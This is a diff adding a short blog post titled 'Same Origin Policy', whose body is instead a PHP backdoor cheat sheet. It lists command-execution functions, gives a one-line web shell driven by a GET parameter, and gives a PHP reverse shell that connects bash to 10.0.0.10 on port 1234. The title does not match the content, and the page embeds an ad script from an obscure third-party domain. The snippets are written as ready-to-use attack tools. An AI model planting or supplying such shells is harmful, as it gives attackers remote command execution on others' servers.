@@ -1,0 +1,25 @@
+---
+layout:     post
+title:      "Same Origin Policy"
+subtitle:   "Intro and classic attacks"
+date:       2016-07-28 11:00:00
+author:     "Heeraj"
+header-img: "img/post-bg-02.png"
+---
+<script type='text/javascript' src='//eclkmpbn.com/adServe/banners?tid=98477_161886_3&type=footer&size=468x60'></script>
+<p>Today I will be writing about the php functions which enable the attacker for gaining the shell. Common php functions
+which enable you to create backdoor. This blog deals with php5 security.</p>
+
+<blockquote>shell_exec() , exec() , passthru() ,system() ,popen()</blockquote>
+
+<p>eval(), create_function(), extract(), file_get_contents, fopen, include, require, curl functions all also can lead to rce</p>
+
+<h2 class="section-heading">Smallest PHP shell</h2>
+
+<blockquote>&#x3C;?=&#x60;$_GET[1]&#x60;?&#x3E;</blockquote>
+
+<h2 class="section-heading">Reverse Shell</h2>
+
+<blockquote>&#x3C;?php exec(&#x22;/bin/bash -c &#x27;bash -i &#x3E;&#x26; /dev/tcp/10.0.0.10/1234 0&#x3E;&#x26;1&#x27;&#x22;);?&#x3E;</blockquote>
+
+<p>This was <a href="http://pwnakil.blogspot.in/2012/09/backdorea-con-las-shell-web-mas-pequenas.html">link</a> that I found while googling</p>
